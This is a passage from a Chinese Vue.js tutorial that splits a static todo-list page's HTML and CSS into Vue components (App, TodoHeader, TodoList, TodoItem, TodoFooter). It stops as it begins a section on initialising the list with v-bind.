html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;todo-container&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;todo-wrap&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;todo-header&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;请输入你的任务名称，按回车键确认&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;todo-main&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> /&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>xxxxx<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-danger&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none&quot;</span>&gt;</span>删除<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> /&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>yyyy<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-danger&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none&quot;</span>&gt;</span>删除<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;todo-footer&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> /&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>已完成0<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> / 全部2<br>          <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-danger&quot;</span>&gt;</span>清除已完成任务<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>需要拆分的<code>css</code></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/*base*/</span><br><span class="hljs-selector-tag">body</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-number">#fff</span>;<br>&#125;<br><br><span class="hljs-selector-class">.btn</span> &#123;<br>  <span class="hljs-attribute">display</span>: inline-block;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">4px</span> <span class="hljs-number">12px</span>;<br>  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">0</span>;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;<br>  <span class="hljs-attribute">line-height</span>: <span class="hljs-number">20px</span>;<br>  <span class="hljs-attribute">text-align</span>: center;<br>  <span class="hljs-attribute">vertical-align</span>: middle;<br>  <span class="hljs-attribute">cursor</span>: pointer;<br>  <span class="hljs-attribute">box-shadow</span>: inset <span class="hljs-number">0</span> <span class="hljs-number">1px</span> <span class="hljs-number">0</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.2</span>), <span class="hljs-number">0</span> <span class="hljs-number">1px</span> <span class="hljs-number">2px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.05</span>);<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;<br>&#125;<br><br><span class="hljs-selector-class">.btn-danger</span> &#123;<br>  <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#da4f49</span>;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#bd362f</span>;<br>&#125;<br><br><span class="hljs-selector-class">.btn-danger</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#bd362f</span>;<br>&#125;<br><br><span class="hljs-selector-class">.btn</span><span class="hljs-selector-pseudo">:focus</span> &#123;<br>  <span class="hljs-attribute">outline</span>: none;<br>&#125;<br><br><span class="hljs-selector-class">.todo-container</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">600px</span>;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;<br>&#125;<br><span class="hljs-selector-class">.todo-container</span> <span class="hljs-selector-class">.todo-wrap</span> &#123;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span>;<br>&#125;<br><br><span class="hljs-comment">/*header*/</span><br><span class="hljs-selector-class">.todo-header</span> <span class="hljs-selector-tag">input</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">560px</span>;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">28px</span>;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ccc</span>;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">4px</span> <span class="hljs-number">7px</span>;<br>&#125;<br><br><span class="hljs-selector-class">.todo-header</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:focus</span> &#123;<br>  <span class="hljs-attribute">outline</span>: none;<br>  <span class="hljs-attribute">border-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">82</span>, <span class="hljs-number">168</span>, <span class="hljs-number">236</span>, <span class="hljs-number">0.8</span>);<br>  <span class="hljs-attribute">box-shadow</span>: inset <span class="hljs-number">0</span> <span class="hljs-number">1px</span> <span class="hljs-number">1px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.075</span>), <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">8px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">82</span>, <span class="hljs-number">168</span>, <span class="hljs-number">236</span>, <span class="hljs-number">0.6</span>);<br>&#125;<br><br><span class="hljs-comment">/*main*/</span><br><span class="hljs-selector-class">.todo-main</span> &#123;<br>  <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">0px</span>;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">2px</span>;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0px</span>;<br>&#125;<br><br><span class="hljs-selector-class">.todo-empty</span> &#123;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;<br>  <span class="hljs-attribute">line-height</span>: <span class="hljs-number">40px</span>;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">2px</span>;<br>  <span class="hljs-attribute">padding-left</span>: <span class="hljs-number">5px</span>;<br>  <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10px</span>;<br>&#125;<br><span class="hljs-comment">/*item*/</span><br><span class="hljs-selector-tag">li</span> &#123;<br>  <span class="hljs-attribute">list-style</span>: none;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">36px</span>;<br>  <span class="hljs-attribute">line-height</span>: <span class="hljs-number">36px</span>;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">5px</span>;<br>  <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;<br>&#125;<br><br><span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">label</span> &#123;<br>  <span class="hljs-attribute">float</span>: left;<br>  <span class="hljs-attribute">cursor</span>: pointer;<br>&#125;<br><br><span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">label</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">input</span> &#123;<br>  <span class="hljs-attribute">vertical-align</span>: middle;<br>  <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">6px</span>;<br>  <span class="hljs-attribute">position</span>: relative;<br>  <span class="hljs-attribute">top</span>: -<span class="hljs-number">1px</span>;<br>&#125;<br><br><span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">button</span> &#123;<br>  <span class="hljs-attribute">float</span>: right;<br>  <span class="hljs-attribute">display</span>: none;<br>  <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">3px</span>;<br>&#125;<br><br><span class="hljs-selector-tag">li</span>:before &#123;<br>  content: initial;<br>&#125;<br><br><span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:last-child</span> &#123;<br>  <span class="hljs-attribute">border-bottom</span>: none;<br>&#125;<br><br><span class="hljs-comment">/*footer*/</span><br><span class="hljs-selector-class">.todo-footer</span> &#123;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;<br>  <span class="hljs-attribute">line-height</span>: <span class="hljs-number">40px</span>;<br>  <span class="hljs-attribute">padding-left</span>: <span class="hljs-number">6px</span>;<br>  <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">5px</span>;<br>&#125;<br><br><span class="hljs-selector-class">.todo-footer</span> <span class="hljs-selector-tag">label</span> &#123;<br>  <span class="hljs-attribute">display</span>: inline-block;<br>  <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">20px</span>;<br>  <span class="hljs-attribute">cursor</span>: pointer;<br>&#125;<br><br><span class="hljs-selector-class">.todo-footer</span> <span class="hljs-selector-tag">label</span> <span class="hljs-selector-tag">input</span> &#123;<br>  <span class="hljs-attribute">position</span>: relative;<br>  <span class="hljs-attribute">top</span>: -<span class="hljs-number">1px</span>;<br>  <span class="hljs-attribute">vertical-align</span>: middle;<br>  <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">5px</span>;<br>&#125;<br><br><span class="hljs-selector-class">.todo-footer</span> <span class="hljs-selector-tag">button</span> &#123;<br>  <span class="hljs-attribute">float</span>: right;<br>  <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">5px</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>拆分好的组件：</p>
<p><code>App.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div id&#x3D;&quot;root&quot;&gt;<br>    &lt;div class&#x3D;&quot;todo-container&quot;&gt;<br>      &lt;div class&#x3D;&quot;todo-wrap&quot;&gt;<br>        &lt;TodoHeader&gt;&lt;&#x2F;TodoHeader&gt;<br><br>        &lt;TodoList&gt;&lt;&#x2F;TodoList&gt;<br><br>        &lt;TodoFooter&gt;&lt;&#x2F;TodoFooter&gt;<br>      &lt;&#x2F;div&gt;<br>    &lt;&#x2F;div&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>import TodoFooter from &quot;.&#x2F;components&#x2F;TodoFooter.vue&quot;;<br>import TodoHeader from &quot;.&#x2F;components&#x2F;TodoHeader.vue&quot;;<br>import TodoList from &quot;.&#x2F;components&#x2F;TodoList.vue&quot;;<br><br>export default &#123;<br>  name: &quot;App&quot;,<br>  components: &#123; TodoFooter, TodoHeader, TodoList &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br><br><br>&lt;style scoped&gt;<br>&#x2F;*base*&#x2F;<br>body &#123;<br>  background: #8080ff;<br>&#125;<br><br>.btn &#123;<br>  display: inline-block;<br>  padding: 4px 12px;<br>  margin-bottom: 0;<br>  font-size: 14px;<br>  line-height: 20px;<br>  text-align: center;<br>  vertical-align: middle;<br>  cursor: pointer;<br>  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),<br>    0 1px 2px rgba(0, 0, 0, 0.05);<br>  border-radius: 4px;<br>&#125;<br><br>.btn-danger &#123;<br>  color: #fff;<br>  background-color: #da4f49;<br>  border: 1px solid #bd362f;<br>&#125;<br><br>.btn-danger:hover &#123;<br>  color: #fff;<br>  background-color: #bd362f;<br>&#125;<br><br>.btn:focus &#123;<br>  outline: none;<br>&#125;<br><br>.todo-container &#123;<br>  width: 600px;<br>  margin: 0 auto;<br>&#125;<br>.todo-container .todo-wrap &#123;<br>  padding: 10px;<br>  border: 1px solid #ddd;<br>  border-radius: 5px;<br>&#125;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>

<p><code>TodoItem.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;li&gt;<br>    &lt;label&gt;<br>      &lt;input type&#x3D;&quot;checkbox&quot; &#x2F;&gt;<br>      &lt;span&gt;yyyy&lt;&#x2F;span&gt;<br>    &lt;&#x2F;label&gt;<br>    &lt;button class&#x3D;&quot;btn btn-danger&quot; style&#x3D;&quot;display: none&quot;&gt;删除&lt;&#x2F;button&gt;<br>  &lt;&#x2F;li&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>  name: &quot;TodoItem&quot;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br><br>&lt;style scoped&gt;<br>&#x2F;*item*&#x2F;<br>li &#123;<br>  list-style: none;<br>  height: 36px;<br>  line-height: 36px;<br>  padding: 0 5px;<br>  border-bottom: 1px solid #ddd;<br>&#125;<br><br>li label &#123;<br>  float: left;<br>  cursor: pointer;<br>&#125;<br><br>li label li input &#123;<br>  vertical-align: middle;<br>  margin-right: 6px;<br>  position: relative;<br>  top: -1px;<br>&#125;<br><br>li button &#123;<br>  float: right;<br>  display: none;<br>  margin-top: 3px;<br>&#125;<br><br>li:before &#123;<br>  content: initial;<br>&#125;<br><br>li:last-child &#123;<br>  border-bottom: none;<br>&#125;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>

<p><code>TodoHeader.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div class&#x3D;&quot;todo-header&quot;&gt;<br>    &lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;请输入你的任务名称，按回车键确认&quot; &#x2F;&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>  name: &quot;TodoHeader&quot;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br><br>&lt;style scoped&gt;<br>&#x2F;*header*&#x2F;<br>.todo-header input &#123;<br>  width: 560px;<br>  height: 28px;<br>  font-size: 14px;<br>  border: 1px solid #ccc;<br>  border-radius: 4px;<br>  padding: 4px 7px;<br>&#125;<br><br>.todo-header input:focus &#123;<br>  outline: none;<br>  border-color: rgba(82, 168, 236, 0.8);<br>  box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075),<br>    0 0 8px rgba(82, 168, 236, 0.6);<br>&#125;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>

<p><code>TodoFooter.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div class&#x3D;&quot;todo-footer&quot;&gt;<br>    &lt;label&gt;<br>      &lt;input type&#x3D;&quot;checkbox&quot; &#x2F;&gt;<br>    &lt;&#x2F;label&gt;<br>    &lt;span&gt; &lt;span&gt;已完成0&lt;&#x2F;span&gt; &#x2F; 全部2 &lt;&#x2F;span&gt;<br>    &lt;button class&#x3D;&quot;btn btn-danger&quot;&gt;清除已完成任务&lt;&#x2F;button&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>  name: &quot;TodoFooter&quot;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br><br>&lt;style scoped&gt;<br>&#x2F;*footer*&#x2F;<br>.todo-footer &#123;<br>  height: 40px;<br>  line-height: 40px;<br>  padding-left: 6px;<br>  margin-top: 5px;<br>&#125;<br><br>.todo-footer label &#123;<br>  display: inline-block;<br>  margin-right: 20px;<br>  cursor: pointer;<br>&#125;<br><br>.todo-footer label input &#123;<br>  position: relative;<br>  top: -1px;<br>  vertical-align: middle;<br>  margin-right: 5px;<br>&#125;<br><br>.todo-footer button &#123;<br>  float: right;<br>  margin-top: 5px;<br>&#125;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>

<p><code>TodoList.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;ul class&#x3D;&quot;todo-main&quot;&gt;<br>    &lt;TodoItem&gt;&lt;&#x2F;TodoItem&gt;<br>    &lt;TodoItem&gt;&lt;&#x2F;TodoItem&gt;<br>    &lt;TodoItem&gt;&lt;&#x2F;TodoItem&gt;<br>    &lt;TodoItem&gt;&lt;&#x2F;TodoItem&gt;<br>  &lt;&#x2F;ul&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>import TodoItem from &quot;.&#x2F;TodoItem.vue&quot;;<br><br>export default &#123;<br>  name: &quot;TodoList&quot;,<br>  components: &#123; TodoItem &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br><br>&lt;style scoped&gt;<br>&#x2F;*main*&#x2F;<br>.todo-main &#123;<br>  margin-left: 0px;<br>  border: 1px solid #ddd;<br>  border-radius: 2px;<br>  padding: 0px;<br>&#125;<br><br>.todo-empty &#123;<br>  height: 40px;<br>  line-height: 40px;<br>  border: 1px solid #ddd;<br>  border-radius: 2px;<br>  padding-left: 5px;<br>  margin-top: 10px;<br>&#125;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>

<h4 id="3-10-2-初始化列表"><a href="#3-10-2-初始化列表" class="headerlink" title="3.10.2 初始化列表"></a>3.10.2 初始化列表</h4><p>注意：由于后续不需要分析style，我们省略后续所有的style标签</p>
<ul>
<li>如何动态的决定一个标签属性的有无？<ul>
<li>使用<code>v-bind:</code>即可</li>
</ul>
</li>
</ul>
<p>修改后的<code>TodoItem.vue</code></p>
